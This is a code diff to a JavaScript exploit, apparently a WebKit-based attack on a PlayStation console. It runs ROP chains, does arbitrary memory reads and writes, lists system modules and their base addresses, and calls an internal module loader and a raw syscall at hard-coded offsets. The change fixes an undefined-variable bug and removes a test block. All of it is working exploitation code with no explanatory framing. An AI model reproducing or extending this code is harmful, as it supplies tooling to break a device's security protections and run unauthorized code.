@@ -172,10 +172,10 @@
         debug_log("buffer addr = 0x" + rop_buf_addr.toString(16))
 
         debug_log("Starting ROP...")
-        
+
         // to use later
         var libSceSysmodule_base = undefined;
-        
+
         debug_log('Printing module information...')
         for (var i = 0; i < 0x100; i++) {
             var buf = storage.alloc(0x1A8)
@@ -190,18 +190,19 @@
             if (read32(ret) != 0)
                 continue;
             var base = read64(buf.add(0x44 * 4))
-            debug_log('Module name: ' + read_str(buf.add(0x8)))
+            var name = read_str(buf.add(0x8))
+            debug_log('Module name: ' + name)
             debug_log('Module Index: ' + i.toString(16))
             debug_log('Module Base: ' + base.toString(16))
             debug_log('===============')
-            
-           if(name == "libSceSysmodule.sprx") {
+
+            if (name == "libSceSysmodule.sprx") {
                 libSceSysmodule_base = base; // save to use later
             }
-            
+
             storage.free(0x1A8 + 0x4)
         }
-        
+
         // test loading libSceAvSetting.sprx, just like CTurt did
         // sceSysmodule.sprx + 0x20A0 = sceSysmoduleLoadModule();
         // int sceSysmoduleLoadModule(__int64 moduleID, __int64 a2, __int64 a3, _DWORD *a4)
@@ -209,21 +210,6 @@
         r.call(libSceSysmodule_base.add(0x20A0), 11, 0, 0, 0);
         r.execute();
         // you can now dump name again and see libSceAvSetting.sprx
-        
-        r = new RopChain()
-        var ret = storage.alloc(0x4)
-        var mod_info = storage.alloc(0x40)
-        write32(mod_info, 0x40)
-        r.syscall(572, webkit_base_addr, 0, mod_info, 0x40)
-        r.add('pop rdi')
-        r.add(ret)
-        r.add('mov qword ptr [rdi], rax')
-        r.execute()
-        debug_log("return val = " + read32(ret).toString(16))
-        debug_log(read_str(mod_info.add(0x8)))
-        for (var i = 0; i < 0x1A8; i += 4)
-            debug_log(read32(mod_info.add(i)).toString(16))
-        storage.free(0x1A8 + 0x4)
 
         debug_log('Testing sockets...')
         var s = socket()
